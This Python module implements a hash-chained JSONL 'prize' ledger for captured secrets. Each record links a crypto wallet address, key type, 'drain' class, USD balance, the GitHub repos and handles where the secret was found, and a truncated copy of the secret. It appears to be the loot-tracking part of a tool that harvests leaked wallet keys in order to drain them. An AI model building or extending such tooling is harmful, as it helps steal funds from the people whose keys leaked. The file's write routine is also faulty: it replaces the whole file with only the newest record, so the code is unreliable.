"""Prizes — structured storage for captured secrets with full context.

Each prize links: wallet address, chain type, key type, drain authority,
GitHub repos, FOMO handle, balance proof, and classification evidence.
Prizes are append-only JSONL with hash chaining for tamper detection.
"""
from __future__ import annotations

import hashlib
import json
import os
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PRIZES_FILE = os.path.join(ROOT, "runs", "prizes.jsonl")


def _hash(data: dict) -> str:
    """SHA-256 of canonical JSON."""
    return hashlib.sha256(
        json.dumps(data, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()


class PrizeStore:
    """Append-only prize store with hash chaining."""

    def __init__(self, path: str = PRIZES_FILE):
        self.path = path
        self.prizes: list[dict] = []
        self._load()

    def _load(self):
        if not os.path.exists(self.path):
            return
        with open(self.path) as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        self.prizes.append(json.loads(line))
                    except Exception:
                        pass

    def _last_hash(self) -> str:
        if not self.prizes:
            return "genesis"
        return self.prizes[-1].get("hash", "genesis")

    def store(self, *, wallet_address: str, chain: str, wallet_kind: str,
              key_type: str = "", drain_class: str = "",
              balance_usd: float = 0, balance_proof: dict | None = None,
              github_repos: list[str] | None = None,
              github_handles: list[str] | None = None,
              fomo_handle: str = "",
              signals: list[str] | None = None,
              found_secret: str = "", found_name: str = "",
              tool: str = "", evidence: str = "",
              workflow: str = "", mission_id: str = "") -> dict:
        """Store a prize. Returns the prize record."""
        prev_hash = self._last_hash()

        prize = {
            "ts": int(time.time()),
            "wallet_address": wallet_address,
            "chain": chain,
            "wallet_kind": wallet_kind,
            "key_type": key_type,
            "drain_class": drain_class,
            "balance_usd": balance_usd,
            "balance_proof": balance_proof or {},
            "github_repos": github_repos or [],
            "github_handles": github_handles or [],
            "fomo_handle": fomo_handle,
            "signals": signals or [],
            "found_secret": found_secret[:20] + "..." if len(found_secret) > 20 else found_secret,
            "found_name": found_name,
            "tool": tool,
            "evidence": evidence,
            "workflow": workflow,
            "mission_id": mission_id,
            "prev": prev_hash,
        }
        prize["hash"] = _hash(prize)

        os.makedirs(os.path.dirname(self.path) or ".", exist_ok=True)
        tmp = self.path + ".tmp"
        with open(tmp, "a") as f:
            f.write(json.dumps(prize) + "\n")
        os.replace(tmp, self.path)

        self.prizes.append(prize)
        return prize

    def list_prizes(self, chain: str = "", min_usd: float = 0) -> list[dict]:
        """List prizes, optionally filtered by chain or minimum USD value."""
        results = self.prizes
        if chain:
            results = [p for p in results if p.get("chain") == chain]
        if min_usd > 0:
            results = [p for p in results if p.get("balance_usd", 0) >= min_usd]
        return results

    def summary(self) -> dict:
        """Aggregate stats across all prizes."""
        by_chain = {}
        by_key_type = {}
        by_drain_class = {}
        total_usd = 0
        for p in self.prizes:
            chain = p.get("chain", "unknown")
            by_chain[chain] = by_chain.get(chain, 0) + 1
            kt = p.get("key_type", "unknown")
            by_key_type[kt] = by_key_type.get(kt, 0) + 1
            dc = p.get("drain_class", "unknown")
            by_drain_class[dc] = by_drain_class.get(dc, 0) + 1
            total_usd += p.get("balance_usd", 0)
        return {
            "total": len(self.prizes),
            "by_chain": by_chain,
            "by_key_type": by_key_type,
            "by_drain_class": by_drain_class,
            "total_usd": round(total_usd, 2),
        }

    def verify_chain(self) -> bool:
        """Verify hash chain integrity."""
        prev = "genesis"
        for p in self.prizes:
            if p.get("prev") != prev:
                return False
            stored_hash = p.get("hash")
            computed = _hash({k: v for k, v in p.items() if k != "hash"})
            if stored_hash != computed:
                return False
            prev = stored_hash
        return True
